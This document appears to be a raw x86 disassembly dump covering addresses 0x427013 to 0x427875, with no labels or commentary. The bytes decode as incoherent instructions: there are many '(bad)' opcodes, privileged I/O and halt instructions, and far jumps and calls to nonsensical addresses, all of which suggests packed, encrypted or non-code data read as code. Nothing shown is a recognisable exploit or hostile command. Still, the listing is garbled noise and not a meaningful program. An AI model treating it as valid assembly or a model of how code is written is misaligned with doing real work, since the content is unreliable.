  427013:	out    0xb4,al
  427015:	stos   DWORD PTR es:[edi],eax
  427016:	cmp    edi,DWORD PTR [ebp+0x40]
  427019:	pop    edx
  42701a:	(bad)
  42701d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42701e:	cmp    bh,BYTE PTR [edx+ebx*1+0x2b62da9]
  427025:	mov    ebx,0xa2cbc916
  42702a:	imul   ecx,DWORD PTR [edx],0xffffffe0
  42702d:	or     ah,dh
  42702f:	gs and eax,0x7acc2afb
  427035:	lahf   
  427036:	shl    BYTE PTR [ebp+0x24b5cbdf],cl
  42703c:	xchg   ecx,eax
  42703d:	mov    eax,ds:0x8e822d4b
  427042:	cli    
  427043:	lods   eax,DWORD PTR ds:[esi]
  427044:	inc    ebp
  427045:	mov    al,0x31
  427047:	pop    es
  427048:	and    eax,0xa3a4b3ca
  42704d:	add    BYTE PTR [ecx-0x37],0xf5
  427051:	jl     0x4270cd
  427053:	call   0x7eef69be
  427058:	sbb    cl,bl
  42705a:	jae    0x42703e
  42705c:	cmp    dl,BYTE PTR [ecx+eiz*4]
  42705f:	or     al,0x9c
  427061:	and    al,0xff
  427063:	inc    ebx
  427064:	adc    dh,BYTE PTR [edx+0xb1ff069]
  42706a:	gs sub eax,0x9d077968
  427070:	mov    ss,WORD PTR ds:0x9a8e271d
  427076:	mov    esi,0x5ba4c144
  42707b:	in     eax,dx
  42707c:	mov    ah,0xd0
  42707e:	dec    esi
  42707f:	jge    0x427004
  427081:	mov    esi,0x1cd057a7
  427086:	out    0xa4,eax
  427088:	pusha  
  427089:	out    0x69,eax
  42708b:	jecxz  0x427034
  42708d:	cwde   
  42708e:	mov    ecx,0xdba42cd0
  427093:	idiv   DWORD PTR [ecx+0x3bfe6fe7]
  427099:	mov    bh,0xe5
  42709b:	adc    ch,bl
  42709d:	or     esi,DWORD PTR [ebx+0x3b55c984]
  4270a3:	hlt    
  4270a4:	in     eax,0x9
  4270a6:	push   esp
  4270a7:	call   0xbebbe20e
  4270ac:	(bad)  [edi-0x187c1a56]
  4270b2:	out    0x4,eax
  4270b4:	sbb    ah,BYTE PTR [esi+edx*8-0x43e82e00]
  4270bb:	stc    
  4270bc:	sar    DWORD PTR [ecx-0x640faf81],0x9
  4270c3:	in     al,dx
  4270c4:	icebp  
  4270c5:	mov    esp,0x6e47a2f2
  4270ca:	int3   
  4270cb:	mov    esi,0x30b5dff2
  4270d0:	cmp    BYTE PTR [ebp+0x343bce9b],bl
  4270d6:	mov    ecx,0x69af6063
  4270db:	adc    ecx,DWORD PTR [ecx]
  4270dd:	add    BYTE PTR [esp+edx*4+0x2912af49],bh
  4270e4:	push   ss
  4270e5:	jp     0x4270c6
  4270e7:	ficomp DWORD PTR [esi]
  4270e9:	jae    0x427103
  4270eb:	mov    ds:0xd6793c38,al
  4270f0:	call   0x59772990
  4270f5:	mov    al,BYTE PTR [esi+0x6c]
  4270f8:	lds    ebp,FWORD PTR [ebx-0x1a]
  4270fb:	in     al,dx
  4270fc:	fcomp  DWORD PTR ds:0x5924e807
  427102:	cmp    ecx,DWORD PTR [edx+0x7]
  427105:	mov    edx,esi
  427107:	inc    ecx
  427108:	cmp    DWORD PTR [edx-0x2f],edi
  42710b:	push   ds
  42710c:	out    0x71,al
  42710e:	push   esp
  42710f:	add    edi,DWORD PTR [edi]
  427111:	push   0xd927464a
  427116:	xor    dh,BYTE PTR [edi]
  427118:	mov    esi,0xe5884892
  42711d:	xchg   ebp,eax
  42711e:	sub    al,0xb2
  427120:	inc    esi
  427121:	push   ebx
  427122:	jmp    0xdbe4aaf8
  427127:	ffreep st(0)
  427129:	shl    DWORD PTR [edi+esi*4+0x4c],1
  42712d:	test   eax,0x69582466
  427132:	xchg   esp,eax
  427133:	xchg   edx,eax
  427134:	add    dh,BYTE PTR [ebx-0x72da12b4]
  42713a:	fsub   st(1),st
  42713c:	pop    eax
  42713d:	int3   
  42713e:	js     0x427155
  427140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427141:	lods   al,BYTE PTR ds:[esi]
  427142:	mov    eax,eax
  427144:	(bad)
  427147:	lock xchg DWORD PTR [ecx],ecx
  42714a:	mov    edx,0x81ed45a6
  42714f:	jmp    0x427156
  427151:	pusha  
  427152:	test   al,0xa6
  427154:	and    DWORD PTR [ecx-0x4d],ebx
  427157:	mov    cl,0xd3
  427159:	loope  0x42710c
  42715b:	sub    al,0x26
  42715d:	test   eax,0x1ca4880b
  427162:	shr    BYTE PTR [edi-0x5b],cl
  427165:	mov    ds:0x69930c29,al
  42716a:	pop    ebx
  42716b:	push   ebx
  42716c:	jmp    0x427197
  42716e:	mov    ecx,0xb74a8c35
  427173:	xor    ah,BYTE PTR [esi+0x36]
  427176:	jae    0x4271d4
  427178:	mov    ds:0xaf750da1,ax
  42717e:	cmp    ecx,DWORD PTR [edi-0x5b42003e]
  427184:	imul   ebp,DWORD PTR [ebx-0x465a53ac],0xffffffe6
  42718b:	in     eax,0x54
  42718d:	push   0xaa0141bd
  427192:	xlat   BYTE PTR ds:[ebx]
  427193:	imul   edx,DWORD PTR [eax],0x1c9d49f6
  427199:	test   eax,0xd9129f55
  42719e:	push   ebx
  42719f:	push   ds
  4271a0:	cmp    eax,0x4972eba7
  4271a5:	nop
  4271a6:	cli    
  4271a7:	lock cmp DWORD PTR [edx+esi*2+0x4d],0xa5a0d4a6
  4271b0:	xor    dh,ch
  4271b2:	mov    ebx,0xb0fd765a
  4271b7:	fwait
  4271b8:	inc    ebp
  4271b9:	shr    BYTE PTR [ebx-0x11],cl
  4271bc:	cmp    DWORD PTR ds:0x9897248,edx
  4271c2:	inc    edx
  4271c3:	push   edi
  4271c4:	jp     0x4271ac
  4271c6:	test   DWORD PTR [eax-0x6743f15b],edi
  4271cc:	(bad)
  4271cf:	call   0xd853a193
  4271d4:	and    al,0xd9
  4271d6:	mov    ah,al
  4271d8:	ss sbb eax,0xa419d825
  4271de:	jmp    0x4271f4
  4271e0:	jb     0x427211
  4271e2:	(bad)  
  4271e3:	mov    esi,0x258743dd
  4271e8:	js     0x427204
  4271ea:	mov    dl,0xa4
  4271ec:	sub    ebx,ebp
  4271ee:	mov    ds:0x551205d0,al
  4271f3:	mov    dl,0xad
  4271f5:	out    dx,eax
  4271f6:	mov    edx,ebp
  4271f8:	enter  0x1b9e,0xca
  4271fc:	push   edi
  4271fd:	inc    esi
  4271fe:	jbe    0x427251
  427200:	add    bl,al
  427202:	add    DWORD PTR [edi+ecx*2+0x22152c45],0x4b3dd769
  42720d:	jl     0x42720b
  42720f:	jnp    0x427272
  427211:	pop    edx
  427212:	fist   DWORD PTR [edx]
  427214:	adc    DWORD PTR cs:[eax-0x682675ec],esi
  42721b:	hlt    
  42721c:	inc    ebp
  42721d:	iret   
  42721e:	cmp    DWORD PTR [eax],eax
  427220:	sub    eax,0xc6bab90b
  427225:	je     0x4271df
  427227:	fsub   DWORD PTR [edx]
  427229:	mov    DWORD PTR [eax],0x4938485
  42722f:	test   BYTE PTR [ecx+0x2b24ba5f],al
  427235:	pop    esi
  427236:	jmp    0x4271d6
  427238:	inc    esi
  427239:	shl    DWORD PTR [ebx+0x26bcb603],0xe0
  427240:	ret    
  427241:	sub    ecx,eax
  427243:	in     eax,dx
  427244:	xor    ebp,edi
  427246:	mov    edi,0xc1e5f0b4
  42724b:	outs   dx,BYTE PTR ds:[esi]
  42724c:	aam    0x9d
  42724e:	imul   ecx,DWORD PTR [ebx],0xd
  427251:	xlat   BYTE PTR ds:[ebx]
  427252:	push   cs
  427253:	adc    DWORD PTR [esi+0x70],esp
  427256:	sub    al,0xd
  427258:	pop    edx
  427259:	mov    al,ds:0xff25c4b3
  42725e:	pop    edx
  42725f:	push   0xe8711825
  427264:	lock popf 
  427266:	mov    al,ds:0x9e4917f1
  42726b:	push   ebx
  42726c:	add    dl,cl
  42726e:	addr16 fwait
  427270:	mov    al,ds:0x725daba2
  427275:	sub    BYTE PTR ds:0xed961182,bl
  42727b:	mov    edx,0x74bab07e
  427280:	xor    bh,BYTE PTR [ecx+ebx*2-0x6e]
  427284:	inc    ebp
  427285:	add    DWORD PTR [ebp+0x1e352df2],ebp
  42728b:	and    al,dl
  42728d:	cwde   
  42728e:	add    al,0x74
  427290:	xchg   ebx,eax
  427291:	mov    edi,0x7b48e4b9
  427296:	pusha  
  427297:	adc    dl,BYTE PTR ds:0x7922b9d
  42729d:	jle    0x427270
  42729f:	jns    0x427275
  4272a1:	leave  
  4272a2:	arpl   WORD PTR [ecx-0x6a],bp
  4272a5:	fidiv  DWORD PTR [ebp-0x7234f6bc]
  4272ab:	inc    ecx
  4272ac:	cmc    
  4272ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272ae:	or     eax,DWORD PTR [esi+0x15]
  4272b1:	imul   ebp,DWORD PTR [esp+edx*4-0x4e],0xf99ab70
  4272b9:	repz mov eax,0xfe73d764
  4272bf:	out    dx,eax
  4272c0:	aad    0x10
  4272c2:	push   0xffffffe5
  4272c4:	inc    edi
  4272c5:	pop    ebx
  4272c6:	pop    edx
  4272c7:	lods   al,BYTE PTR ds:[esi]
  4272c8:	push   ss
  4272c9:	cmp    DWORD PTR [ebx],edi
  4272cb:	test   eax,0xae37f66e
  4272d0:	lock adc edi,DWORD PTR [ebx+esi*2]
  4272d4:	dec    ebp
  4272d5:	xchg   esp,eax
  4272d6:	mov    eax,DWORD PTR [edi]
  4272d8:	(bad)  
  4272d9:	mov    BYTE PTR [eax],dh
  4272db:	call   0x86b1dfea
  4272e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4272e1:	jmp    0x301f:0xfc1f5d5f
  4272e8:	adc    bh,dl
  4272ea:	sub    eax,0x8bf74ffd
  4272ef:	cmp    bh,dh
  4272f1:	lahf   
  4272f2:	addr16 inc eax
  4272f4:	outs   dx,DWORD PTR ds:[esi]
  4272f5:	or     al,0x22
  4272f7:	sbb    eax,0xc4b38403
  4272fc:	in     al,0x89
  4272fe:	les    ecx,FWORD PTR [eax+0x25]
  427301:	jne    0x427337
  427303:	cmp    eax,0xe65a3595
  427308:	sub    DWORD PTR [edi],ebx
  42730a:	fst    DWORD PTR [edi+0x77]
  42730d:	mov    al,0xe2
  42730f:	aas    
  427310:	ins    BYTE PTR es:[edi],dx
  427311:	data16 mov dl,0x24
  427314:	push   ss
  427315:	pusha  
  427316:	add    ch,0x85
  427319:	(bad)  
  42731a:	repz clc 
  42731c:	push   eax
  42731d:	sar    BYTE PTR [ecx+0x274c12d8],cl
  427323:	lods   al,BYTE PTR ds:[esi]
  427324:	mov    cl,0xab
  427326:	iret   
  427327:	adc    al,0x14
  427329:	or     eax,0x652b8d84
  42732e:	xor    dl,dh
  427330:	sub    al,0x99
  427332:	pop    esi
  427333:	fbstp  TBYTE PTR [esp+edx*4+0x6f84151b]
  42733a:	std    
  42733b:	ins    DWORD PTR es:[edi],dx
  42733c:	iret   
  42733d:	fs leave 
  42733f:	dec    ecx
  427340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427341:	std    
  427342:	fbld   TBYTE PTR [edx-0x7631b02a]
  427348:	push   eax
  427349:	stc    
  42734a:	ret    
  42734b:	add    al,0xee
  42734d:	sahf   
  42734e:	rol    DWORD PTR [ecx+eiz*1],cl
  427351:	sub    ah,0x25
  427354:	mov    bh,0xac
  427356:	add    edx,esp
  427358:	sbb    bl,ch
  42735a:	mov    ch,0x44
  42735c:	sbb    al,0xe9
  42735e:	jo     0x42731d
  427360:	cmc    
  427361:	xor    esp,ebx
  427363:	mov    bh,0xb6
  427365:	sbb    DWORD PTR [edi-0xcc6ce6c],0x49
  42736c:	enter  0x6f9f,0xe1
  427370:	daa    
  427371:	cmp    eax,0xee80eaa7
  427376:	mov    eax,0xe0cca1d4
  42737b:	out    dx,al
  42737c:	xor    eax,0x64f13491
  427381:	iret   
  427382:	sub    dh,BYTE PTR [edi+eax*2]
  427385:	stc    
  427386:	fst    DWORD PTR [edi+0x775335e4]
  42738c:	mov    eax,ds:0xf5e7bc23
  427391:	pop    ebp
  427392:	in     eax,dx
  427393:	call   0x975f9171
  427398:	inc    esi
  427399:	jmp    0x5814f0ff
  42739e:	add    ebx,DWORD PTR [eax+0x66a7f25f]
  4273a4:	(bad)  
  4273a5:	in     al,0x49
  4273a7:	push   esp
  4273a8:	xchg   esi,eax
  4273a9:	pop    ebp
  4273aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273ab:	add    al,0x70
  4273ad:	pushf  
  4273ae:	jno    0x4273d1
  4273b0:	sbb    eax,0x286902b9
  4273b5:	(bad)  
  4273b6:	cmp    dh,ch
  4273b8:	adc    eax,0x21f7cf23
  4273bd:	dec    ecx
  4273be:	pop    ebp
  4273bf:	mov    ch,0xe2
  4273c1:	lahf   
  4273c2:	jmp    FWORD PTR [ebx+eiz*1+0x174c1ac9]
  4273c9:	fwait
  4273ca:	neg    DWORD PTR [ebp-0x51]
  4273cd:	adc    ebp,DWORD PTR [esp+ebp*2+0x7a]
  4273d1:	fstp   TBYTE PTR [edx]
  4273d3:	retf   0x84c6
  4273d6:	stc    
  4273d7:	push   ds
  4273d8:	mov    ebx,DWORD PTR [edx+0x37]
  4273db:	mov    bl,0xb2
  4273dd:	xchg   BYTE PTR [eax],ch
  4273df:	test   DWORD PTR [ebx],esp
  4273e1:	leave  
  4273e2:	push   es
  4273e3:	sub    al,0x6b
  4273e5:	es sbb ch,cl
  4273e8:	test   DWORD PTR [eax],eax
  4273ea:	(bad)  
  4273eb:	call   0x8f527a1
  4273f0:	dec    ecx
  4273f1:	test   eax,0x98b8568d
  4273f6:	push   0xffffffb0
  4273f8:	sahf   
  4273f9:	sub    ah,BYTE PTR [ecx]
  4273fb:	out    dx,al
  4273fc:	mov    ch,0x70
  4273fe:	sbb    ebp,edx
  427400:	cld    
  427401:	and    eax,DWORD PTR [ebx+edi*2+0x58ab918]
  427408:	int    0x33
  42740a:	and    BYTE PTR [ebx+0x2b2b9d2d],al
  427410:	fimul  WORD PTR [edx-0x32247d11]
  427416:	fdivr  DWORD PTR [ebp+0x185ba39e]
  42741c:	add    eax,0x85fc0272
  427421:	mov    al,ds:0xea6bf1b
  427426:	cwde   
  427427:	shr    edi,cl
  427429:	add    esi,eax
  42742b:	adc    ebx,edx
  42742d:	outs   dx,DWORD PTR ds:[esi]
  42742e:	cs push ecx
  427430:	or     DWORD PTR [esi+edi*4],0x7513c52f
  427437:	bnd jno 0x42746f
  42743a:	dec    ecx
  42743b:	mov    edx,0xc1a33917
  427440:	jnp    0x4273f8
  427442:	icebp  
  427443:	imul   esi,DWORD PTR [ecx],0xffffff9a
  427446:	mov    ebx,0x16b88765
  42744b:	pop    ss
  42744c:	inc    eax
  42744d:	sbb    bh,ch
  42744f:	cwde   
  427450:	and    ecx,ebx
  427452:	mov    ah,0xbd
  427454:	lahf   
  427455:	add    edi,edi
  427457:	jo     0x42743f
  427459:	pushf  
  42745a:	mov    edi,esi
  42745c:	sub    al,0xde
  42745e:	fwait
  42745f:	jmp    0x85ab:0x17c48947
  427466:	jl     0x4273f1
  427468:	push   ebp
  427469:	xchg   esi,eax
  42746a:	ss daa 
  42746c:	(bad)  [edx]
  42746e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42746f:	out    0xc1,eax
  427471:	or     ah,0x4f
  427474:	mov    eax,ds:0xca41002e
  427479:	fnstsw WORD PTR [esp+esi*8+0x53e31925]
  427480:	nop
  427481:	leave  
  427482:	dec    ecx
  427483:	mov    bl,0xd7
  427485:	(bad)  
  427486:	cmp    al,0x6b
  427488:	mov    eax,0x291a08af
  42748d:	nop
  42748e:	stos   BYTE PTR es:[edi],al
  42748f:	out    0x58,al
  427491:	cwde   
  427492:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427493:	mov    esi,0x4e48388
  427498:	or     al,0x26
  42749a:	cmp    esi,eax
  42749c:	or     cl,BYTE PTR [ecx-0x234ad746]
  4274a2:	lock jmp 0xa91a:0x9987eb88
  4274aa:	add    al,BYTE PTR [edi+0x76585feb]
  4274b0:	xchg   ebx,eax
  4274b1:	cdq    
  4274b2:	frstor [ebp+0xa7bf2a6]
  4274b9:	add    eax,0x8132d33
  4274be:	mov    ecx,0xfec23894
  4274c3:	mov    dh,BYTE PTR [ebp+0xb]
  4274c6:	repz out 0x77,eax
  4274c9:	imul   edi,esp,0x8327bb14
  4274cf:	sbb    BYTE PTR [edx+0x4b],dl
  4274d2:	mov    cl,0x74
  4274d4:	ins    BYTE PTR es:[edi],dx
  4274d5:	cmp    BYTE PTR [edi-0x31aca48],ah
  4274db:	jmp    0x694a:0xb2eb81c0
  4274e2:	lea    ebp,[ecx+ebp*1-0xa]
  4274e6:	push   eax
  4274e7:	pop    es
  4274e8:	jg     0x42751b
  4274ea:	jmp    0x427555
  4274ec:	mov    ch,0x3
  4274ee:	mov    esi,ecx
  4274f0:	lds    esp,FWORD PTR [esp+ebx*4-0x287228d2]
  4274f7:	shl    ebp,cl
  4274f9:	outs   dx,BYTE PTR ds:[esi]
  4274fa:	pop    esp
  4274fb:	repz in eax,dx
  4274fd:	shl    BYTE PTR [ebx-0x3b],cl
  427500:	in     eax,0x5
  427502:	jmp    0x3bd5c5ec
  427507:	iret   
  427508:	(bad)  
  427509:	mov    WORD PTR [edi+0x3a],ds
  42750c:	sbb    eax,0x9dbde9e9
  427511:	mov    ds:0xf1bf3fc,al
  427516:	int3   
  427517:	xchg   ebp,eax
  427518:	iret   
  427519:	sbb    al,BYTE PTR [eax+eax*1+0x22]
  42751d:	xchg   edi,eax
  42751e:	test   cl,0xda
  427521:	and    esi,DWORD PTR [edi]
  427523:	addr16 int 0x67
  427526:	mov    esp,0xeed92e44
  42752b:	mov    cl,0x28
  42752d:	adc    BYTE PTR ds:0x65b44548,bl
  427533:	out    dx,al
  427534:	test   DWORD PTR [eax],edx
  427536:	dec    edx
  427537:	xchg   edx,eax
  427538:	mov    eax,0xe9d4b070
  42753d:	inc    esp
  42753e:	fidiv  WORD PTR [ebp-0xb]
  427541:	outs   dx,DWORD PTR ds:[esi]
  427542:	xchg   esi,eax
  427543:	in     eax,dx
  427544:	inc    ecx
  427545:	push   ds
  427546:	popf   
  427547:	in     eax,0x8e
  427549:	stc    
  42754a:	jecxz  0x427539
  42754c:	aaa    
  42754d:	jecxz  0x4275be
  42754f:	call   0xf672:0xe5a9ef0f
  427556:	adc    ah,BYTE PTR [eax]
  427558:	xor    eax,0x5de5a12a
  42755d:	das    
  42755e:	or     cl,BYTE PTR [eax]
  427560:	scas   eax,DWORD PTR es:[edi]
  427561:	cmp    DWORD PTR [edx+0x7f],ecx
  427564:	imul   ebx,DWORD PTR [edx+0x4c226c33],0xfffffff9
  42756b:	pop    edx
  42756c:	inc    ebp
  42756d:	mov    ah,0xe5
  427570:	cwde   
  427571:	(bad)
  427575:	cmp    edx,DWORD PTR [ebx+0x5bb5059d]
  42757b:	nop
  42757c:	pusha  
  42757d:	repz sub BYTE PTR [ebx],cl
  427580:	sahf   
  427581:	or     BYTE PTR [edx],bh
  427583:	and    al,BYTE PTR ds:0x20ee2e15
  427589:	push   ebx
  42758a:	test   BYTE PTR [ebx+edi*1-0x47],0xb5
  42758f:	call   0x91675d8d
  427594:	cdq    
  427595:	jae    0x427607
  427597:	call   0x3b289462
  42759c:	xchg   DWORD PTR [esi-0x1ccafb09],esp
  4275a2:	leave  
  4275a3:	push   edi
  4275a4:	nop
  4275a5:	mov    esp,0x8bd184b4
  4275aa:	fild   DWORD PTR [ecx-0x4a]
  4275ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275ae:	inc    esp
  4275af:	push   edi
  4275b0:	jecxz  0x427555
  4275b2:	scas   al,BYTE PTR es:[edi]
  4275b3:	sbb    cl,BYTE PTR [eax+0x5d]
  4275b6:	dec    edx
  4275b7:	or     al,0xcb
  4275b9:	xchg   ecx,eax
  4275ba:	mov    bl,0x74
  4275bc:	in     eax,0x2c
  4275be:	es push esi
  4275c0:	aad    0x52
  4275c2:	push   ecx
  4275c3:	jmp    0xe3da8710
  4275c8:	sub    ecx,edi
  4275ca:	pop    ss
  4275cb:	outs   dx,BYTE PTR ds:[esi]
  4275cc:	sbb    eax,0x1729c923
  4275d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275d2:	fidiv  DWORD PTR [edi-0x6b]
  4275d5:	stc    
  4275d6:	shr    ebx,0x1f
  4275d9:	jbe    0x427567
  4275db:	or     eax,0x901b0923
  4275e0:	dec    eax
  4275e1:	(bad)  
  4275e2:	shl    BYTE PTR [ecx+0x73],cl
  4275e5:	call   0x8ca8:0x20034cb
  4275ec:	xor    BYTE PTR [edx+0x3d],cl
  4275ef:	retf   
  4275f0:	sbb    BYTE PTR [ecx],bh
  4275f2:	lock ret 0xc62f
  4275f6:	lea    ecx,[esi+0x21]
  4275f9:	xchg   BYTE PTR ds:0x17a13dd5,cl
  4275ff:	in     eax,0x91
  427601:	mov    ecx,0x2922bc40
  427606:	leave  
  427607:	mov    dh,0x64
  427609:	popf   
  42760a:	pushf  
  42760b:	and    DWORD PTR [eax],0xffffff9f
  42760e:	or     ebp,esp
  427610:	pop    esp
  427611:	pop    ss
  427612:	push   esp
  427613:	sub    eax,0xec415941
  427618:	addr16 dec edx
  42761a:	mov    ah,0x64
  42761c:	mov    ss,WORD PTR [ebp-0x75b9f68c]
  427622:	mov    bh,0x5b
  427624:	push   ecx
  427625:	pushf  
  427626:	fcmove st,st(3)
  427628:	arpl   WORD PTR [ebx+0xe],si
  42762b:	push   0xffffffee
  42762d:	fnstsw WORD PTR [eax+0x224d74a4]
  427633:	ins    DWORD PTR es:[edi],dx
  427634:	inc    ebp
  427635:	xor    esp,esi
  427637:	out    0x28,eax
  427639:	cmp    eax,ecx
  42763b:	pop    edi
  42763c:	sbb    eax,0xd28063d9
  427641:	pop    eax
  427642:	mov    edi,0xdc1367f0
  427647:	push   ds
  427648:	jnp    0x427657
  42764a:	mov    al,ds:0x9563ab53
  42764f:	icebp  
  427650:	pop    ss
  427651:	cdq    
  427652:	push   es
  427653:	popf   
  427654:	push   ebx
  427655:	pop    eax
  427656:	sub    DWORD PTR [eax+0x2b2ba3e9],esi
  42765c:	addr16 mov ebx,0x9c16a1c
  427662:	nop
  427663:	xor    DWORD PTR [edi+0x1b85a9b6],esi
  427669:	sub    DWORD PTR [edi+edi*4],ecx
  42766c:	inc    ebx
  42766d:	pop    ebp
  42766e:	std    
  42766f:	sahf   
  427670:	adc    eax,0x5bea2a4d
  427675:	test   DWORD PTR [edx+0x6ae921ac],ecx
  42767b:	retf   0xeaba
  42767e:	ror    BYTE PTR [eax+ebx*1-0x60],cl
  427682:	mov    ebx,0x81e853a5
  427687:	push   edi
  427688:	clc    
  427689:	push   ss
  42768a:	mov    ebx,0xb4af1cce
  42768f:	fs inc edi
  427691:	pusha  
  427692:	movups XMMWORD PTR [esi-0x12ea87ca],xmm4
  427699:	cld    
  42769a:	fist   DWORD PTR [ebx+0x10b3b3cf]
  4276a0:	test   DWORD PTR [edx+0x20ef33e3],edx
  4276a6:	mov    edi,0x1337e3b4
  4276ab:	mov    esp,0xed4211d5
  4276b0:	ins    BYTE PTR es:[edi],dx
  4276b1:	xchg   ecx,eax
  4276b2:	xchg   BYTE PTR ds:0xb240e0a7,ch
  4276b8:	sbb    DWORD PTR [ecx+0x7dc8312],ebx
  4276be:	rol    BYTE PTR [eax],cl
  4276c0:	into   
  4276c1:	test   al,0xab
  4276c3:	fwait
  4276c4:	adc    cl,al
  4276c6:	mov    bl,bl
  4276c8:	aam    0x82
  4276ca:	dec    esi
  4276cb:	icebp  
  4276cc:	pop    esi
  4276cd:	fnstcw WORD PTR [ecx-0x237976d6]
  4276d3:	retf   
  4276d4:	push   0xffffffca
  4276d6:	mov    eax,ds:0xbe9a9afa
  4276db:	sub    dl,bl
  4276dd:	or     eax,0xad27ac6d
  4276e2:	mov    ecx,0x795fa4dc
  4276e7:	bnd jl 0x4276b3
  4276ea:	iret   
  4276eb:	les    esp,FWORD PTR [ebp-0x55]
  4276ee:	and    al,0xd1
  4276f0:	mov    BYTE PTR [esi-0x21602f02],cl
  4276f6:	enter  0x570e,0x1a
  4276fa:	loope  0x427750
  4276fc:	pop    ecx
  4276fd:	sub    BYTE PTR [eax+0x5c5b62ef],bh
  427703:	cmp    eax,0x535bc2cc
  427708:	adc    BYTE PTR [ebx],ch
  42770a:	mov    ebp,0xffa11b2c
  42770f:	stos   DWORD PTR es:[edi],eax
  427710:	in     eax,0x4
  427712:	imul   ebx,eax,0x6
  427715:	mov    ch,0x40
  427717:	add    DWORD PTR [eax+0x1cbab679],eax
  42771d:	lahf   
  42771e:	or     eax,0xb857a9e5
  427723:	in     al,0xb7
  427725:	daa    
  427726:	mov    ah,0xad
  427728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427729:	jg     0x427787
  42772b:	dec    edi
  42772c:	jecxz  0x427780
  42772e:	(bad)  
  42772f:	loop   0x4276f2
  427731:	enter  0x62e6,0x85
  427735:	loopne 0x427768
  427737:	outs   dx,DWORD PTR ds:[esi]
  427738:	hlt    
  427739:	xchg   edx,eax
  42773a:	sub    esi,DWORD PTR [ebx]
  42773c:	push   esi
  42773d:	cmp    eax,0x9f8764b0
  427742:	push   ds
  427743:	lds    edx,FWORD PTR ds:0xe3e78cbe
  427749:	add    BYTE PTR [ebx+0x56],cl
  42774c:	and    BYTE PTR [ecx+0x5e],cl
  42774f:	xchg   ebp,eax
  427750:	or     eax,0xaf40748e
  427755:	xchg   esi,eax
  427756:	sub    al,0x9a
  427758:	mov    edi,0xc54a7795
  42775d:	lahf   
  42775e:	mov    eax,0xbd6989d4
  427763:	xchg   ebp,eax
  427764:	or     bh,0xcf
  427767:	aad    0x79
  427769:	pop    esp
  42776a:	mov    esp,0xbb9bb5d6
  42776f:	lods   al,BYTE PTR ds:[esi]
  427770:	push   ss
  427771:	pop    esi
  427772:	jnp    0x4277f3
  427774:	push   es
  427775:	loope  0x4277da
  427777:	cwde   
  427778:	lahf   
  427779:	iret   
  42777a:	in     eax,0xf4
  42777c:	loope  0x427725
  42777e:	enter  0x2966,0x9a
  427782:	mov    ebx,0x586ca025
  427787:	xchg   esi,eax
  427788:	mov    ds:0xc0a7b13e,al
  42778d:	xchg   esi,eax
  42778e:	out    0x25,al
  427790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427791:	jo     0x42774f
  427793:	xchg   esp,eax
  427794:	fmul   QWORD PTR [ebx-0x16]
  427797:	mov    ebp,0xc13b9f9b
  42779c:	mov    esp,0x825ec011
  4277a1:	adc    al,0x95
  4277a3:	shl    BYTE PTR ds:[si+0x66],cl
  4277a8:	ret    
  4277a9:	ret    
  4277aa:	mov    edx,0xdfe0240
  4277af:	fcomp  DWORD PTR [esi-0x5f]
  4277b2:	cmp    eax,DWORD PTR [ebp+0x69]
  4277b5:	push   ds
  4277b6:	and    al,ch
  4277b8:	and    ch,BYTE PTR [ecx+0x27]
  4277bb:	add    ch,BYTE PTR [esi-0x7b7d5702]
  4277c1:	mov    esi,0x9897fc8b
  4277c6:	outs   dx,DWORD PTR ds:[esi]
  4277c7:	pop    ebx
  4277c8:	and    eax,0x8323d095
  4277cd:	dec    eax
  4277ce:	push   ss
  4277cf:	or     DWORD PTR [esi+0x74],0xffffffd9
  4277d3:	add    al,0xfb
  4277d5:	punpckhwd mm6,mm6
  4277d8:	dec    DWORD PTR [edi+0x1513f590]
  4277de:	mov    cl,0xfa
  4277e0:	and    al,0x69
  4277e2:	jb     0x4277fd
  4277e4:	mov    ch,0xd8
  4277e6:	pop    esi
  4277e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4277e8:	xchg   esp,eax
  4277e9:	popf   
  4277ea:	fstp   TBYTE PTR [eax-0x71ba148]
  4277f0:	sbb    esi,0x5436bcdf
  4277f6:	mov    bl,0x94
  4277f8:	je     0x427865
  4277fa:	jmp    0x89f2:0xe5bdf50f
  427801:	xor    BYTE PTR [esi+eiz*2+0x15],0xf9
  427806:	xor    dh,0xb8
  427809:	adc    ah,BYTE PTR [ecx+0x252777b9]
  42780f:	cmp    BYTE PTR [ebp-0x43],al
  427812:	das    
  427813:	in     al,dx
  427814:	in     eax,0xa
  427816:	push   ss
  427817:	outs   dx,BYTE PTR ds:[esi]
  427818:	xchg   ebx,eax
  427819:	jmp    0x18006534
  42781e:	xor    al,0x7
  427820:	(bad)  
  427821:	push   edi
  427822:	mov    eax,0xb1b0f56c
  427827:	out    0x51,eax
  427829:	retf   
  42782a:	aad    0x86
  42782c:	sbb    BYTE PTR [ecx],cl
  42782e:	retf   
  42782f:	fmul   DWORD PTR [edx-0x4e]
  427832:	mov    bh,0x8b
  427834:	fldenv [ebx+0x4cf524db]
  42783a:	and    eax,0xd4317211
  42783f:	inc    ebp
  427840:	call   0xe0de:0xaa04b904
  427847:	cli    
  427848:	in     eax,0x57
  42784a:	xchg   bh,ah
  42784c:	into   
  42784d:	leave  
  42784e:	test   BYTE PTR [ebp+0x5522a91c],ch
  427854:	daa    
  427855:	add    eax,0x24cb26ad
  42785a:	dec    esi
  42785b:	mov    ds:0x16df4212,eax
  427860:	push   eax
  427861:	xchg   ecx,eax
  427862:	dec    esi
  427863:	inc    esp
  427864:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427866:	add    DWORD PTR [ebx+0x33ee494],0x14dfc9ad
  427870:	push   cs
  427871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427872:	loope  0x42785a
  427874:	into   
  427875:	mov    eax,ds:0x8f1e3dfb
